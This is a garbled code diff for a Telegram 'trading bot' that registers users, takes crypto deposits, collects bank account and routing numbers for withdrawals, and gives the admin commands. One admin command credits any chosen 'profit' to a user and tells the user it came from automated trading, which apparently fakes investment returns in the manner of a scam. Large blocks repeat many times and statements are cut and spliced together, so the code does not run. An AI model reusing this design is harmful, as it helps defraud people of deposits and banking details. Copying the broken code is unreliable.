+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, get_name),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
             await context.bot.send_message(
                 chat_id=update.effective_chat.id,
-                text=part,
+                text=users_list,
                 parse_mode='Markdown'
             )
-    else:
-        await update.message.reply_text(users_list, parse_mode='Markdown')
-
-async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Show admin commands"""
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await update.message.reply_text("❌ Unauthorized access.")
-        return
     
-    help_text = """🛠 **Admin Panel Guide** 🛠
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
 
 Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
 
@@ -1390,21 +1593,17 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 - View all registered users with details (ID, name, email, balance, etc.).
 - Use the 'List Users' button or /listusers.
 
-✅ **Approve User**
-- Approve a user's account to grant access to trading features.
-- Command: /approveuser <user_id>
-- Example: /approveuser 123456789
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
 
-💳 **Approve Deposit**
-- Confirm a user's deposit to update their balance.
-- Command: /approve <user_id> <amount>
-- Example: /approve 123456789 1000.50
-- Alternatively, use the 'Approve' button in deposit notifications.
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
 
-💸 **Approve Withdrawal**
-- Process a user's withdrawal request.
-- Command: /approvewithdrawal <user_id> <amount>
-- Example: /approvewithdrawal 123456789 500.25
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
 
 📈 **Update Profit**
 - Add profit to a user's account based on trading bot performance.
@@ -1421,138 +1620,9018 @@ Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and 
 
 **Tips:**
 - Use /getid to find a user's ID.
-- Check deposit notifications for pending approvals.
+- Most approvals now work with buttons for easier management.
 - All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
     
-    await update.message.reply_text(help_text, parse_mode='Markdown')
+    return ADMIN_STATE
 
-async def send_admin_panel(context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Send admin panel to admin on bot startup"""
-    panel_text = """🛠 **NCW Trading Bot Admin Panel** 🛠
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
 
-Welcome to the admin control center. Manage users, transactions, and system settings below."""
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
     
     keyboard = [
-        [InlineKeyboardButton("👥 List Users", callback_data='admin_list_users')],
-        [InlineKeyboardButton("✅ Approve User", callback_data='admin_approve_user')],
-        [InlineKeyboardButton("💳 Approve Deposit", callback_data='admin_approve_deposit')],
-        [InlineKeyboardButton("💸 Approve Withdrawal", callback_data='admin_approve_withdrawal')],
-        [InlineKeyboardButton("📈 Update Profit", callback_data='admin_update_profit')],
-        [InlineKeyboardButton("🪙 Update Crypto Address", callback_data='admin_update_crypto')],
-        [InlineKeyboardButton("ℹ️ Help", callback_data='admin_help')]
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
         await context.bot.send_message(
             chat_id=ADMIN_USER_ID,
-            text=panel_text,
+            text=admin_message,
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
     except TelegramError as e:
-        logger.error(f"Failed to send admin panel on startup: {e}")
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle errors"""
-    logger.error(f"Update {update} caused error {context.error}")
-    
-    if update and update.effective_message:
-        await update.effective_message.reply_text(
-            "⚠️ An error occurred. Please try again or contact support if the problem persists."
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
         )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
 
-def main() -> None:
-    """Start the bot and send admin panel"""
-    if not BOT_TOKEN:
-        logger.error("BOT_TOKEN environment variable not set!")
-        return
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
     
-    if not ADMIN_USER_ID:
-        logger.error("ADMIN_USER_ID environment variable not set!")
-        return
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
     
-    application = Application.builder().token(BOT_TOKEN).build()
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
     
-    # Send admin panel on startup
-    application.job_queue.run_once(send_admin_panel, 1)
-    
-    conv_handler = ConversationHandler(
-        entry_points=[
-            CommandHandler("start", start),
-            CommandHandler("adminpanel", admin_panel),
-        ],
-        states={
-            WAITING_NAME: [
-                CallbackQueryHandler(start_registration, pattern='^start_registration$'),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_name),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             WAITING_EMAIL: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_email),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             WAITING_PHONE: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
